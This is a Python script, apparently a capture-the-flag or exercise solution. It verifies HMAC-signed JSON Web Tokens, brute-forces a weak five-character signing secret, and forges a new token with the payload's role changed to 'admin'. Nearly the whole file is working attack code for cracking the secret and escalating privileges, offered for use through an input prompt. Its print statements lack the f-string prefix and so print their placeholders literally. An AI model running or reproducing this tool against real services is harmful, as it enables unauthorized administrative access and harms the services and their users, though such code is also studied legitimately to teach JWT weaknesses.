import hmac
import hashlib
import base64
import json

class IncorrectKeyError(Exception):
    pass

class IncorrectAlgorithmError(Exception):
    pass

def verifyJwt(token, secret):
    '''
    Function that verifies the JSON Web Token
    Input: token, secret
    '''
    og_token = token.split('.')

    og_header,og_payload,og_sig = og_token
    data = (og_header + "." + og_payload).encode()

    if (json.loads(base64.urlsafe_b64decode(og_header + "==").decode())['alg'] == 'HS256'):
        sig = hmac.new(secret.encode(), data , hashlib.sha256)
        sig = sig.digest()
        sig = base64.urlsafe_b64encode(sig)
        sig = sig.decode("utf-8")
        sig = sig.replace('=','')
    elif (json.loads(base64.urlsafe_b64decode(og_header + "==").decode())['alg'] == 'HS512'):
        sig = hmac.new(secret.encode(), data , hashlib.sha512)
        sig = sig.digest()
        sig = base64.urlsafe_b64encode(sig)
        sig = sig.decode("utf-8")
        sig = sig.replace('=','')
    else:
        raise IncorrectAlgorithmError("Incorrect Algorithm")

    if(sig == og_sig):
        return (og_payload)
    else:
        raise IncorrectKeyError("Incorrect key")

def find_secret(jwt):
    s = "1234567890qwertyuiopasdfghjklzxcvbnm"

    for a in s:
        for b in s:
            for c in s:
                for d in s:
                    for e in s:
                        curr = a+b+c+d+e                           
                            
                        try:
                            verifyJwt(jwt,curr)
                            return jwt, curr
                        except:
                            pass


def create_jwt(jwt, secret):
    og_token = jwt.split(".")
    og_header,og_payload,og_sig = og_token

    pl = json.loads(base64.urlsafe_b64decode(og_payload + "==").decode())
    pl["role"] = "admin"

    pl2 = json.dumps(pl)
    pl2 = pl2.replace(' ','')
    pl2 = pl2.encode()
    new_payload = base64.urlsafe_b64encode(pl2)
    new_payload = new_payload.decode()
    new_payload = new_payload.rstrip("=")

    stuff = og_header + "." + new_payload
    stuff_encoded = stuff.encode()
    sig = hmac.new(secret.encode(), stuff_encoded, hashlib.sha256)
    sig = sig.hexdigest()
    sig = bytes.fromhex(sig)
    sig = base64.urlsafe_b64encode(sig)
    sig = sig.decode()
    sig = sig.rstrip("=")

    
    new_token = stuff + "." + sig
    return new_token


if __name__ == "__main__":
    jwt = input("Jwt: ")

    jwt, secret = find_secret(jwt)
    print("The secret is {secret}")

    new_jwt = create_jwt(jwt, secret)
    print("The new jwt is {new_jwt}")





